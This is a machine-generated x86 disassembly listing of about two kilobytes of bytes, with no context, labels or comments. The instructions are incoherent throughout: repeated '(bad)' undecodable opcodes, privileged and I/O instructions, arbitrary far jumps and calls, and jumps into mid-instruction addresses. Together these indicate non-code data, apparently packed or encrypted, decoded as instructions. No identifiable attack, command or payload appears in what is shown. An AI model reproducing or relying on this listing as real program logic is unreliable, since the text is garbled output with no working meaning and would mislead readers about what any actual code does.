  4235e9:	mov    dl,0x66
  4235eb:	(bad)  
  4235ec:	sub    DWORD PTR [edi+0x19],ecx
  4235ef:	js     0x423670
  4235f1:	pop    ebp
  4235f2:	xor    BYTE PTR [eax-0x2b71dcd1],ch
  4235f8:	mov    DWORD PTR [ecx-0x5e],eax
  4235fb:	call   0x6968c4ce
  423600:	retf   
  423601:	pop    ecx
  423602:	xchg   esp,eax
  423603:	pop    edx
  423604:	pop    ss
  423605:	pop    ss
  423606:	or     al,0x7c
  423608:	and    BYTE PTR [edi+0x7fcad79],ah
  42360e:	icebp  
  42360f:	fdivr  QWORD PTR [edx+eax*2+0x66]
  423613:	(bad)  
  423617:	sbb    ebx,DWORD PTR [ebp-0x7bf2f5e8]
  42361d:	lods   al,BYTE PTR ds:[esi]
  42361e:	mov    dh,0x88
  423620:	jns    0x42366a
  423622:	stos   BYTE PTR es:[edi],al
  423623:	push   ecx
  423624:	jp     0x42368d
  423626:	rcr    edi,1
  423628:	push   esi
  423629:	push   esi
  42362a:	mov    esi,0x86c81a80
  42362f:	sbb    bl,ah
  423631:	(bad)  
  423632:	pop    ecx
  423633:	push   cs
  423634:	or     dl,BYTE PTR [ebx+0x76]
  423637:	leave  
  423638:	ret    
  423639:	js     0x4235f7
  42363b:	xchg   DWORD PTR [edi-0x52614d2d],esi
  423641:	aad    0xed
  423643:	push   ebx
  423644:	addr16 int 0x76
  423647:	sti    
  423648:	retf   
  423649:	mov    bl,0xbb
  42364b:	aaa    
  42364c:	sbb    al,0x7e
  42364e:	adc    DWORD PTR [edx-0x31],esp
  423651:	inc    esi
  423652:	retf   
  423653:	jl     0x4236c2
  423655:	cmp    DWORD PTR [eax+ebp*2-0x377341ac],edx
  42365c:	(bad)  
  42365e:	jmp    0x161f:0xefd420a5
  423665:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423667:	in     al,dx
  423668:	xor    eax,0xe06c6536
  42366d:	and    DWORD PTR [edx],ecx
  42366f:	sub    DWORD PTR [ebx+eax*2],ebp
  423672:	or     ecx,DWORD PTR [ebp-0x408fab0f]
  423678:	xor    ch,dl
  42367a:	jecxz  0x423675
  42367c:	or     al,0x31
  42367e:	xchg   esi,eax
  42367f:	mov    cl,0x36
  423681:	cmp    BYTE PTR [edx-0x7e],ch
  423684:	mov    ebx,0x33839b7f
  423689:	mov    ah,ch
  42368b:	mov    ecx,0x9dd01f66
  423690:	xchg   esp,eax
  423691:	sbb    DWORD PTR [eax-0x7d01351f],ebp
  423697:	add    eax,0xe3542e79
  42369c:	mov    BYTE PTR [esi],al
  42369e:	dec    esp
  42369f:	ficomp WORD PTR [edi]
  4236a1:	leave  
  4236a2:	and    BYTE PTR [ebx+ebx*4-0x832507d],bl
  4236a9:	adc    al,BYTE PTR [eax]
  4236ab:	mov    dh,0xa0
  4236ad:	cld    
  4236ae:	(bad)  
  4236af:	stc    
  4236b0:	cmp    ch,ch
  4236b2:	mov    BYTE PTR [eax-0x2c88055b],ah
  4236b8:	cmp    al,0x12
  4236ba:	fs (bad) 
  4236bc:	ds mov ch,0x6d
  4236bf:	mov    bl,0x1f
  4236c1:	dec    eax
  4236c2:	loopne 0x423685
  4236c4:	jge    0x4236fd
  4236c6:	pushf  
  4236c7:	and    ch,BYTE PTR [esi-0x5d]
  4236ca:	outs   dx,BYTE PTR ds:[esi]
  4236cb:	sbb    eax,0xd8234a4a
  4236d0:	mov    eax,ds:0x9c60e90b
  4236d5:	cmp    DWORD PTR [edi],eax
  4236d7:	outs   dx,DWORD PTR ss:[esi]
  4236d9:	pop    es
  4236da:	in     al,0x52
  4236dc:	daa    
  4236dd:	adc    al,0x79
  4236df:	js     0x423732
  4236e1:	ins    BYTE PTR es:[edi],dx
  4236e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236e3:	mov    cl,0xbc
  4236e5:	jbe    0x423692
  4236e7:	int    0x21
  4236e9:	(bad)  
  4236ea:	jbe    0x423695
  4236ec:	xchg   DWORD PTR [ebp+0x57200038],edi
  4236f2:	imul   DWORD PTR [edi]
  4236f4:	xchg   DWORD PTR [esi-0x26],esp
  4236f7:	sub    al,0x37
  4236f9:	clc    
  4236fa:	lahf   
  4236fb:	push   esp
  4236fc:	xor    BYTE PTR [eax+ebx*8],bh
  4236ff:	call   DWORD PTR [edi+0x63]
  423702:	es xchg esp,eax
  423704:	adc    ebx,DWORD PTR [ebp-0x44c50f5f]
  42370a:	(bad)  
  42370b:	imul   edx,DWORD PTR [ecx],0x7581fd8f
  423711:	into   
  423712:	icebp  
  423713:	cmp    eax,0xae233302
  423718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423719:	add    BYTE PTR [eax-0x40],dl
  42371c:	jp     0x4236d7
  42371e:	into   
  42371f:	add    al,0x3c
  423721:	push   edx
  423722:	or     al,dh
  423724:	daa    
  423725:	pusha  
  423726:	pop    edx
  423727:	xor    DWORD PTR [ebp+0x32808427],ecx
  42372d:	mov    edx,0x4da33a60
  423732:	aaa    
  423733:	das    
  423734:	div    DWORD PTR [edx*8-0x6474e2e7]
  42373b:	push   ebp
  42373c:	repz inc ecx
  42373e:	xchg   edi,eax
  42373f:	imul   esi,DWORD PTR [edx+eax*8-0x1bc9040a],0x28
  423747:	jecxz  0x4237b7
  423749:	push   eax
  42374a:	add    eax,0x28f5400f
  42374f:	ret    0x3805
  423752:	cmp    ebx,0x371941ed
  423758:	popa   
  423759:	mov    bl,0x9c
  42375b:	ret    
  42375c:	call   DWORD PTR [ecx+0x3db09131]
  423762:	cmp    DWORD PTR [edi+esi*8-0x3756c7f2],edi
  423769:	retf   
  42376a:	fidiv  WORD PTR [ebx+0x49]
  42376d:	xor    ch,0x88
  423770:	out    0x1e,eax
  423772:	sbb    ebx,DWORD PTR [esi-0x764fef39]
  423778:	xor    edi,DWORD PTR ds:0xbb44487f
  42377e:	div    BYTE PTR [edx+0x7f23f309]
  423784:	add    edx,DWORD PTR [eax+0x46d7d445]
  42378a:	mov    edx,0x29cc1a74
  42378f:	outs   dx,BYTE PTR ds:[esi]
  423790:	inc    ebx
  423791:	ret    0xbb27
  423794:	test   BYTE PTR [edx],0xd3
  423797:	mov    esi,0x52e5b417
  42379c:	mov    dl,0xda
  42379e:	push   edx
  42379f:	dec    esp
  4237a0:	repnz sub ebp,ebx
  4237a3:	push   esp
  4237a4:	sbb    eax,0x5d6f4b62
  4237a9:	pusha  
  4237aa:	stos   BYTE PTR es:[edi],al
  4237ab:	mov    ah,0x25
  4237ad:	and    BYTE PTR [edx+0x7376f5ed],dh
  4237b3:	mul    al
  4237b5:	or     DWORD PTR [ebp+0xc2beea5],ecx
  4237bb:	mov    ch,al
  4237bd:	lods   eax,DWORD PTR ds:[esi]
  4237be:	and    ebx,ecx
  4237c0:	loopne 0x4237b1
  4237c2:	pop    edi
  4237c3:	jge    0x423787
  4237c5:	imul   edi,DWORD PTR [eax-0x60dfc7ea],0x64
  4237cc:	or     edi,DWORD PTR [edi]
  4237ce:	cs mov dl,0xc0
  4237d1:	stos   BYTE PTR es:[edi],al
  4237d2:	mov    ds:0x1466aa96,al
  4237d7:	jmp    0x1eb7:0xa4cbf77
  4237de:	js     0x423852
  4237e0:	outs   dx,BYTE PTR ds:[esi]
  4237e1:	or     DWORD PTR [ecx],0xffffffff
  4237e4:	mov    al,0x47
  4237e6:	in     eax,dx
  4237e7:	ficom  DWORD PTR [ebp+0x1b]
  4237ea:	adc    al,0x7b
  4237ec:	jle    0x4237d2
  4237ee:	xor    eax,0x9c888942
  4237f3:	fiadd  DWORD PTR [ebx+0x5674ae7e]
  4237f9:	xor    BYTE PTR [eax+0x7b32a035],bl
  4237ff:	fucom  st(2)
  423801:	push   eax
  423802:	push   ds
  423803:	add    eax,DWORD PTR [eax]
  423805:	add    ah,cl
  423807:	sbb    edx,esi
  423809:	sbb    edi,DWORD PTR [ecx-0x4a224ee8]
  42380f:	xchg   ebx,eax
  423810:	or     ah,bh
  423812:	lods   al,BYTE PTR ds:[esi]
  423813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423814:	mov    al,0xb9
  423816:	dec    esi
  423817:	xchg   BYTE PTR [edi+0x2e],dl
  42381a:	lea    ebp,[esi]
  42381c:	push   ds
  42381d:	xlat   BYTE PTR ds:[ebx]
  42381e:	dec    esi
  42381f:	call   0x8bc0:0xd56bbafc
  423826:	mov    al,ds:0x4bd1b43a
  42382b:	fdiv   DWORD PTR [eax-0x53]
  42382e:	daa    
  42382f:	in     al,dx
  423830:	loope  0x4238a7
  423832:	imul   ebp,DWORD PTR [ebp+0x1a],0x2c8394bf
  423839:	sub    WORD PTR [edx-0x37],dx
  42383d:	sbb    dh,al
  42383f:	mov    ds,ebp
  423841:	retf   0x3176
  423844:	jno    0x423871
  423846:	dec    esp
  423847:	mov    dl,0xc5
  423849:	adc    al,bh
  42384b:	cdq    
  42384c:	mov    al,0x88
  42384e:	ss out 0x4f,al
  423851:	push   esp
  423852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423853:	mov    es,WORD PTR [ebp-0x40]
  423856:	xor    al,0xe0
  423858:	lea    edi,[eax+eiz*2-0x3af5b1a5]
  42385f:	cs inc esi
  423861:	push   cs
  423862:	mov    ecx,0x4b907d7a
  423867:	cdq    
  423868:	test   DWORD PTR [edi+edx*8+0x56],ebx
  42386c:	call   0x1cfe7e63
  423871:	imul   DWORD PTR [eax-0x6b]
  423874:	xchg   esi,eax
  423875:	out    dx,al
  423876:	mov    ebx,0xc42cef83
  42387b:	and    DWORD PTR [esp+eax*4+0x34],edx
  42387f:	test   eax,0xe6d5927d
  423884:	or     esp,DWORD PTR [edx-0x4e]
  423887:	dec    ecx
  423888:	cmp    DWORD PTR [edi-0x2d],edi
  42388b:	outs   dx,DWORD PTR ds:[esi]
  42388c:	out    0x23,al
  42388e:	push   es
  42388f:	jmp    0x4238ee
  423891:	into   
  423892:	ja     0x4238d2
  423894:	push   0x482535d0
  423899:	xchg   ebp,eax
  42389a:	fldln2 
  42389c:	dec    edi
  42389d:	sub    al,0x8e
  42389f:	retf   
  4238a0:	lahf   
  4238a1:	xchg   BYTE PTR [ebx-0x2f],al
  4238a4:	xchg   DWORD PTR [ebp+0x77],esi
  4238a7:	inc    edx
  4238a8:	mov    ds,WORD PTR [edx]
  4238aa:	mov    bl,0x9e
  4238ac:	aas    
  4238ad:	out    0xcc,al
  4238af:	nop
  4238b0:	pop    ecx
  4238b1:	repz icebp 
  4238b3:	ja     0x423851
  4238b5:	dec    edi
  4238b6:	push   es
  4238b7:	pop    esp
  4238b8:	mov    ds:0x7dcf37a1,al
  4238bd:	imul   bh
  4238bf:	stc    
  4238c0:	push   edi
  4238c1:	ins    DWORD PTR es:[edi],dx
  4238c2:	outs   dx,DWORD PTR ds:[esi]
  4238c3:	adc    al,0x2d
  4238c5:	int    0xcd
  4238c7:	shr    cl,cl
  4238c9:	inc    ebp
  4238ca:	push   ss
  4238cb:	jmp    0x9a68:0x92962c8e
  4238d2:	xchg   dh,bl
  4238d4:	aad    0xd0
  4238d6:	scas   al,BYTE PTR es:[edi]
  4238d7:	pop    DWORD PTR [eax+0x56]
  4238da:	cmp    esi,DWORD PTR [esi]
  4238dc:	out    dx,eax
  4238dd:	pop    ebp
  4238de:	pop    esi
  4238df:	retf   
  4238e0:	scas   eax,DWORD PTR es:[edi]
  4238e1:	xor    al,0xfd
  4238e3:	inc    ebp
  4238e4:	or     DWORD PTR [edx],0xffffffc8
  4238e7:	cdq    
  4238e8:	ja     0x423927
  4238ea:	sub    al,0xe9
  4238ec:	dec    esp
  4238ed:	or     esi,DWORD PTR [edi-0x3f]
  4238f0:	std    
  4238f1:	push   0xffffffb5
  4238f3:	inc    edi
  4238f4:	nop
  4238f5:	push   ss
  4238f6:	pop    edi
  4238f7:	jbe    0x4238c5
  4238f9:	push   edx
  4238fa:	mov    eax,ds:0xf2d71b2a
  4238ff:	scas   al,BYTE PTR es:[edi]
  423900:	jp     0x4238b1
  423902:	ins    DWORD PTR es:[edi],dx
  423903:	pop    ds
  423904:	cmp    DWORD PTR [esi],0x44
  423907:	xchg   edx,eax
  423908:	mov    ecx,0x947057a8
  42390d:	retf   0xf602
  423910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423911:	jo     0x42391c
  423913:	xlat   BYTE PTR ds:[ebx]
  423914:	jmp    0x6ecb:0x63e9a63c
  42391b:	push   ds
  42391c:	pop    edi
  42391d:	pop    ds
  42391e:	ret    
  42391f:	call   0x886c8fcc
  423924:	or     BYTE PTR [ecx+0x1b30fc50],cl
  42392a:	les    edi,FWORD PTR [ebx+esi*1-0x60f98ef2]
  423931:	adc    BYTE PTR [edi-0x4145d948],cl
  423937:	jmp    0x79b8:0x5e60d65e
  42393e:	sub    BYTE PTR [edi+0x538f82a1],bh
  423944:	dec    DWORD PTR [edi-0x7d]
  423947:	fidivr DWORD PTR [edi-0x19cc92d8]
  42394d:	sahf   
  42394e:	call   0xc0c24096
  423953:	push   esp
  423954:	mov    al,0xba
  423956:	imul   ebp,DWORD PTR [eax+0x4c2e60b1],0xffffff94
  42395d:	or     eax,0x31f5790e
  423962:	imul   ecx,edi,0xffffffa1
  423965:	jle    0x423981
  423967:	add    al,0xe8
  423969:	jmp    0xf149:0x6db1df76
  423970:	xchg   BYTE PTR [eax+0x1a],bh
  423973:	jo     0x4239e3
  423975:	outs   dx,DWORD PTR ds:[esi]
  423976:	lea    ecx,[ebp-0x5b16a4]
  42397c:	out    dx,al
  42397d:	jnp    0x423985
  42397f:	xor    BYTE PTR [edx],cl
  423981:	rcl    DWORD PTR [esi],0xc7
  423984:	movntps XMMWORD PTR [edi+0x67],xmm3
  423988:	jecxz  0x4239cd
  42398a:	xchg   BYTE PTR [edx+edx*2],bh
  42398d:	ror    DWORD PTR [esi+0x52],cl
  423990:	pop    edi
  423991:	jmp    0x423916
  423993:	jbe    0x4239e9
  423995:	loopne 0x4239bd
  423997:	push   ebp
  423998:	push   0x41e6bda4
  42399d:	sbb    eax,0x16be004d
  4239a2:	mov    ebx,0x397459de
  4239a7:	jl     0x42393a
  4239a9:	lea    ebp,[eax+0x44]
  4239ac:	xchg   edx,eax
  4239ad:	fsub   DWORD PTR [esi-0x61def252]
  4239b3:	gs aam 0x62
  4239b6:	add    ch,al
  4239b8:	pop    eax
  4239b9:	mov    bl,0xd
  4239bb:	fidivr WORD PTR [edx+0x1f]
  4239be:	sar    BYTE PTR [edx+edx*4-0xf],0x9e
  4239c3:	sub    ebp,0xf4fbe182
  4239c9:	ja     0x42399b
  4239cb:	mov    ch,0xf
  4239cd:	push   esi
  4239ce:	(bad)  cs:[ecx+0x7c]
  4239d2:	ss in  al,dx
  4239d4:	jb     0x4239b8
  4239d6:	aad    0x33
  4239d8:	in     al,dx
  4239d9:	xor    BYTE PTR [ebp+0x5f],0xb0
  4239dd:	fld    DWORD PTR [esi]
  4239df:	imul   eax,DWORD PTR ds:0xac67d75a,0x74
  4239e6:	xor    BYTE PTR [eax+0x1d95ac2e],al
  4239ec:	inc    ebp
  4239ed:	inc    edi
  4239ee:	dec    ecx
  4239ef:	hlt    
  4239f0:	and    dl,BYTE PTR [ebx-0x5645960]
  4239f6:	scas   eax,DWORD PTR es:[edi]
  4239f7:	shl    BYTE PTR [edx+0x5e],cl
  4239fa:	add    bl,cl
  4239fc:	dec    esi
  4239fd:	xchg   ecx,eax
  4239fe:	pop    edx
  4239ff:	adc    BYTE PTR [esi-0x78],0x82
  423a03:	add    DWORD PTR [ebx+0x545fd744],0x7eaf46e0
  423a0d:	pop    eax
  423a0e:	loop   0x423a18
  423a10:	and    DWORD PTR [ebx],0x4c
  423a13:	pop    edx
  423a14:	pop    ecx
  423a15:	mov    eax,0x999e55cb
  423a1a:	inc    edx
  423a1b:	pop    eax
  423a1c:	inc    esi
  423a1d:	(bad)  
  423a1e:	leave  
  423a1f:	and    al,0x4d
  423a21:	mov    es,WORD PTR [edx+0x3b1e65f6]
  423a27:	sbb    BYTE PTR [ebx-0xb7725f3],ch
  423a2d:	mov    eax,ds:0xa071ff28
  423a32:	mov    ds:0xc328330a,eax
  423a37:	pop    eax
  423a38:	push   0xffffffb7
  423a3a:	adc    eax,0x18f86cee
  423a3f:	clc    
  423a40:	dec    eax
  423a41:	mov    esp,0xa5e63a94
  423a46:	fwait
  423a47:	sbb    al,0xde
  423a49:	mov    al,ds:0xb1becf4d
  423a4e:	out    dx,eax
  423a4f:	sahf   
  423a50:	sbb    ah,bh
  423a52:	loope  0x423a37
  423a54:	test   eax,0x39715b2
  423a59:	fdivr  QWORD PTR [eax-0x7a]
  423a5c:	lds    eax,FWORD PTR [edi+0x50961f7d]
  423a62:	out    0xc0,al
  423a64:	mov    cl,0x17
  423a66:	mov    eax,ds:0xe9c68b65
  423a6b:	loope  0x423a20
  423a6d:	pop    eax
  423a6e:	cmp    DWORD PTR [edi-0x4adfae78],esi
  423a74:	mov    al,ds:0xa5d1fd51
  423a79:	fcmovnb st,st(0)
  423a7b:	inc    ebp
  423a7c:	sahf   
  423a7d:	mov    edi,DWORD PTR [ebx]
  423a7f:	add    eax,0x56bf7916
  423a84:	jl     0x423ae1
  423a86:	vmwrite eax,DWORD PTR es:[edi]
  423a8a:	pusha  
  423a8b:	test   eax,eax
  423a8d:	dec    ebp
  423a8e:	das    
  423a8f:	add    al,0x9e
  423a91:	stos   BYTE PTR es:[edi],al
  423a92:	fwait
  423a93:	and    al,0xdb
  423a95:	push   eax
  423a96:	mov    dh,0x47
  423a98:	std    
  423a99:	sub    eax,0x28fd42a7
  423a9e:	mov    ecx,0xb47c4087
  423aa3:	clc    
  423aa4:	mov    ds:0x30ce0f2d,eax
  423aa9:	and    BYTE PTR [ecx-0x434d11cf],0x65
  423ab0:	enter  0x3bc8,0x10
  423ab4:	retf   
  423ab5:	out    dx,eax
  423ab6:	stos   DWORD PTR es:[edi],eax
  423ab7:	js     0x423b0e
  423ab9:	adc    al,0xd8
  423abb:	call   0xae7a012c
  423ac0:	gs and eax,0x9965026b
  423ac6:	test   esp,eax
  423ac8:	ins    DWORD PTR es:[edi],dx
  423ac9:	dec    edi
  423aca:	push   0x71
  423acc:	push   es
  423acd:	jb     0x423a6a
  423acf:	mov    ds:0x4de69602,al
  423ad4:	out    dx,eax
  423ad5:	xchg   DWORD PTR [ebx-0x67],esi
  423ad8:	test   BYTE PTR [edx],dh
  423ada:	mov    bl,0x7c
  423adc:	int    0x82
  423ade:	cs stos BYTE PTR es:[edi],al
  423ae0:	lods   eax,DWORD PTR ds:[si]
  423ae2:	push   es
  423ae3:	rcr    ebx,cl
  423ae5:	xchg   BYTE PTR ds:0xa0a43e03,ch
  423aeb:	cs or  ecx,0x22
  423aef:	cli    
  423af0:	and    BYTE PTR [ebx],bh
  423af2:	in     eax,0xe
  423af4:	mov    bh,BYTE PTR [ebp+0x43]
  423af7:	pop    ss
  423af8:	dec    esp
  423af9:	sbb    ebp,DWORD PTR [esi]
  423afb:	jp     0x423aa8
  423afd:	pop    ss
  423afe:	xchg   esp,eax
  423aff:	rcl    cl,1
  423b01:	shl    BYTE PTR [eax-0xf],cl
  423b04:	mov    ah,0x21
  423b06:	jbe    0x423b1f
  423b08:	sbb    edi,DWORD PTR [edi-0x4a3e8a72]
  423b0e:	iret   
  423b0f:	sbb    ebp,0x7fa720f1
  423b15:	std    
  423b16:	fmul   st(1),st
  423b18:	xor    esp,ecx
  423b1a:	mov    WORD PTR [ecx-0x5044a7b8],?
  423b20:	mov    cl,0xd6
  423b22:	sub    eax,0x7105c83c
  423b27:	sbb    eax,0xf4a202dd
  423b2c:	iret   
  423b2d:	or     DWORD PTR [esi+0x1f],ebp
  423b30:	push   ecx
  423b31:	cmc    
  423b32:	es dec edi
  423b34:	loope  0x423ab6
  423b36:	push   ecx
  423b37:	call   0x3395:0x4d97928
  423b3e:	sbb    al,0x92
  423b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b41:	inc    eax
  423b42:	lock pop esi
  423b44:	mov    dh,0x5d
  423b46:	cmp    al,0x36
  423b48:	pop    ebx
  423b49:	dec    ebx
  423b4a:	or     eax,DWORD PTR [edx-0x7eb65750]
  423b50:	ja     0x423b97
  423b52:	outs   dx,BYTE PTR ds:[esi]
  423b53:	ret    
  423b54:	lahf   
  423b55:	xor    bl,0xbb
  423b58:	jmp    0x423b22
  423b5a:	aam    0x21
  423b5c:	sub    BYTE PTR [ecx],ah
  423b5e:	dec    eax
  423b5f:	mov    eax,0x4b76fc27
  423b64:	cmp    edi,DWORD PTR [ecx+0x78ef79b9]
  423b6a:	push   esp
  423b6c:	std    
  423b6d:	aaa    
  423b6e:	scas   eax,DWORD PTR es:[edi]
  423b6f:	and    bl,BYTE PTR [ecx]
  423b71:	pop    edi
  423b72:	or     dl,dh
  423b74:	jmp    DWORD PTR [eax+eax*2-0xac5d866]
  423b7b:	push   eax
  423b7c:	mov    ebp,0x74f9ce05
  423b81:	repnz mov eax,0x3e7c5027
  423b87:	stos   DWORD PTR es:[edi],eax
  423b88:	pop    edx
  423b8a:	mov    ebp,0xbb50087f
  423b8f:	and    al,BYTE PTR [ecx]
  423b91:	cmp    ebx,ebx
  423b93:	sbb    DWORD PTR [ebx],esi
  423b95:	imul   eax,DWORD PTR [edx-0x18],0x7625dff8
  423b9c:	mov    esp,DWORD PTR [eax]
  423b9e:	jg     0x423bac
  423ba0:	pop    ebx
  423ba1:	xor    eax,0xa38bf6f7
  423ba6:	or     al,BYTE PTR [edx+edi*4-0x29]
  423baa:	xchg   BYTE PTR ds:0xa91f7fa3,ch
  423bb0:	xchg   ebp,eax
  423bb1:	pushf  
  423bb2:	sub    eax,DWORD PTR [edx]
  423bb4:	adc    dh,BYTE PTR [eax]
  423bb6:	leave  
  423bb7:	mov    ecx,0x3e30d1dd
  423bbc:	mov    ah,0x1e
  423bbe:	lods   al,BYTE PTR ds:[esi]
  423bbf:	or     eax,DWORD PTR [edi+0x63cba135]
  423bc5:	retf   
  423bc6:	mov    al,ds:0x700ceff9
  423bcb:	adc    BYTE PTR [edx+0x68b8699a],0x14
  423bd2:	push   0x27d008cc
  423bd7:	imul   esi,DWORD PTR [eax],0x42107618
  423bdd:	ss xor al,0xf9
  423be0:	xor    al,0x12
  423be2:	aas    
  423be3:	hlt    
  423be4:	(bad)  
  423be5:	mov    cl,0xb0
  423be7:	jl     0x423c61
  423be9:	mov    ds:0x571dff90,eax
  423bee:	mov    WORD PTR [edx],ss
  423bf0:	inc    edx
  423bf1:	mov    dh,0xa8
  423bf3:	sbb    BYTE PTR [eax],dl
  423bf5:	jg     0x423c69
  423bf7:	mov    eax,0x41c6ea6e
  423bfc:	imul   edx,DWORD PTR [eax],0xa9571e81
  423c02:	mov    al,0xeb
  423c04:	call   0xe217:0xcb31cf85
  423c0b:	in     ax,0x1b
  423c0e:	test   al,0xb2
  423c10:	gs jb  0x423bb8
  423c13:	(bad)  
  423c15:	and    cl,bh
  423c17:	in     eax,dx
  423c18:	icebp  
  423c19:	xor    dh,BYTE PTR [ebx]
  423c1b:	mov    DWORD PTR [edi-0x54396c1d],0xc1a00919
  423c25:	sub    eax,DWORD PTR [ebp+0x127330ff]
  423c2b:	pop    esi
  423c2c:	out    dx,al
  423c2d:	ror    DWORD PTR [esi],1
  423c2f:	jne    0x423caa
  423c31:	mov    ch,bh
  423c33:	rol    BYTE PTR [edi-0xf385cb8],cl
  423c39:	jl     0x423c27
  423c3b:	cmp    eax,0x27b5c4eb
  423c40:	or     DWORD PTR [edi],ebp
  423c42:	aam    0xc4
  423c44:	push   0xfffffff3
  423c46:	mov    bh,0xdb
  423c48:	pop    edi
  423c49:	jbe    0x423ca9
  423c4b:	in     eax,dx
  423c4c:	inc    ecx
  423c4d:	mov    ch,0x9b
  423c4f:	inc    ebx
  423c50:	sbb    ah,dh
  423c52:	push   esi
  423c53:	repnz cli 
  423c55:	mov    bh,0x77
  423c57:	sbb    bh,BYTE PTR [ebx+ecx*8+0x18d74e28]
  423c5e:	stos   DWORD PTR es:[edi],eax
  423c5f:	iret   
  423c60:	push   0x15
  423c62:	sub    DWORD PTR [ecx],0x14
  423c65:	js     0x423c84
  423c67:	or     eax,0x127131ad
  423c6c:	in     eax,0x52
  423c6e:	xor    BYTE PTR [ebx-0x4f],bh
  423c71:	mov    eax,0xd7369e04
  423c76:	std    
  423c77:	into   
  423c78:	mov    ss,WORD PTR ds:0xd526ef3b
  423c7e:	cs push 0x50
  423c81:	xlat   BYTE PTR ds:[ebx]
  423c82:	mov    edx,0x15d1fcd5
  423c87:	mov    al,0x3e
  423c89:	add    eax,0x4750c1f9
  423c8e:	xchg   esp,eax
  423c8f:	cmp    eax,0x6bf8d5b
  423c94:	sbb    BYTE PTR [esi-0x623a4281],bl
  423c9a:	pusha  
  423c9b:	jne    0x423cf7
  423c9d:	and    eax,0xa0a8cbe6
  423ca2:	jo     0x423c54
  423ca4:	push   es
  423ca5:	lock sbb al,0x65
  423ca8:	cwde   
  423ca9:	jnp    0x423c73
  423cab:	imul   edx,DWORD PTR [ebp+0x3],0x12
  423caf:	pop    eax
  423cb0:	inc    ebp
  423cb1:	jmp    0x65aea473
  423cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cb7:	inc    ebx
  423cb8:	or     eax,0xf99485e3
  423cbd:	jmp    0x423cbb
  423cbf:	cmp    bl,BYTE PTR [eax+ebx*4]
  423cc2:	es stc 
  423cc4:	scas   al,BYTE PTR es:[edi]
  423cc5:	je     0x423c80
  423cc7:	rcr    DWORD PTR [ecx+0x5b],1
  423cca:	mov    ebx,0x1a19908c
  423ccf:	push   edx
  423cd0:	in     al,dx
  423cd1:	jmp    0x5dbb:0x1b32d0
  423cd8:	nop
  423cd9:	aaa    
  423cda:	dec    esi
  423cdb:	jecxz  0x423cf6
  423cdd:	and    ch,ah
  423cdf:	js     0x423d1b
  423ce1:	mov    cs,WORD PTR [eax+0x2b6807a8]
  423ce7:	inc    ebx
  423ce8:	fwait
  423ce9:	xchg   DWORD PTR [esi+0x63],edi
  423cec:	adc    eax,0x485aa8dd
  423cf1:	jae    0x423cd7
  423cf3:	push   edx
  423cf4:	mov    ecx,0xe081c0fa
  423cf9:	inc    eax
  423cfa:	or     eax,0x50c6edb3
  423cff:	hlt    
  423d00:	fwait
  423d01:	shl    BYTE PTR [eax-0x65b14b94],1
  423d07:	test   BYTE PTR [edx-0x638157fe],bh
  423d0d:	inc    ecx
  423d0e:	rol    BYTE PTR [ecx+0x5d],cl
  423d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d12:	push   ss
  423d13:	dec    edi
  423d14:	and    ah,BYTE PTR [ebx+edx*2]
  423d17:	addr16 pop edx
  423d19:	jae    0x423cf5
  423d1b:	cwde   
  423d1c:	add    BYTE PTR [ebp+0x17f28dba],ah
  423d22:	xchg   ecx,eax
  423d23:	xor    ch,BYTE PTR ds:0x537cc41
  423d29:	mov    DWORD PTR ds:[ecx-0x4fb30867],edx
  423d30:	aad    0xa9
  423d32:	test   al,0xec
  423d34:	xchg   edi,ecx
  423d36:	sbb    al,0xb
  423d38:	rol    BYTE PTR [edi+0x6920c5d9],0x1f
  423d3f:	mov    ds:0xea9e0a30,eax
  423d44:	je     0x423d7a
  423d46:	outs   dx,DWORD PTR ds:[esi]
  423d47:	dec    ebp
  423d48:	mov    ds:0x1c4a4868,al
  423d4d:	out    dx,eax
  423d4e:	out    dx,eax
  423d4f:	add    BYTE PTR [esi+eiz*1],dl
  423d52:	and    cl,BYTE PTR ds:0x1404c473
  423d58:	add    BYTE PTR [ebp+ebx*4+0x3e],al
  423d5c:	push   eax
  423d5d:	hlt    
  423d5e:	dec    edi
  423d5f:	xchg   esp,eax
  423d60:	out    0xc9,al
  423d62:	xor    esp,DWORD PTR [ebx+0x279d238a]
  423d68:	add    edx,ecx
  423d6a:	jmp    0x608c57ca
  423d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d70:	or     DWORD PTR [esi+0x208d80d3],0xc576799d
  423d7a:	dec    edx
  423d7b:	jecxz  0x423d6a
  423d7d:	or     edi,DWORD PTR [bx+si+0x292a]
  423d82:	mov    ebx,0x10041d1
  423d87:	push   0x2fbfde9f
  423d8c:	push   0xfffffffe
  423d8e:	hlt    
  423d8f:	loopne 0x423d3f
  423d91:	es jne 0x423dcf
  423d94:	lods   eax,DWORD PTR ss:[esi]
  423d96:	push   ebp
  423d97:	inc    ebx
  423d98:	inc    ebp
  423d99:	mov    al,dl
  423d9b:	mov    ah,0x7e
  423d9d:	inc    eax
  423d9e:	ss aas 
  423da0:	sub    eax,0x25300bc6
  423da5:	or     eax,0xbf0d23fe
  423daa:	lods   eax,DWORD PTR ds:[esi]
  423dab:	aad    0x9c
  423dad:	mov    eax,0xb26219a6
  423db2:	mov    bh,0x83
  423db4:	in     eax,dx
  423db5:	mov    ebp,0xc0379e1d
  423dba:	or     bl,BYTE PTR [ebx-0x605a2148]
  423dc0:	popa   
  423dc1:	pop    ss
  423dc2:	std    
  423dc3:	add    al,0x8f
  423dc5:	stos   DWORD PTR es:[edi],eax
  423dc6:	lods   al,BYTE PTR ds:[esi]
  423dc7:	mov    ebx,0x16fe2a7
  423dcc:	jae    0x423d63
  423dce:	jo     0x423e4d
  423dd0:	sub    BYTE PTR [edx-0x18],bl
  423dd3:	test   DWORD PTR [ebp+0x182dd795],ecx
  423dd9:	and    eax,0x5511d836
  423dde:	mov    dh,BYTE PTR [edx-0x50]
  423de1:	leave  
  423de2:	xchg   esp,eax
  423de3:	repz xor BYTE PTR [eax+0x5a77d38b],bl
  423dea:	addr16 pop eax
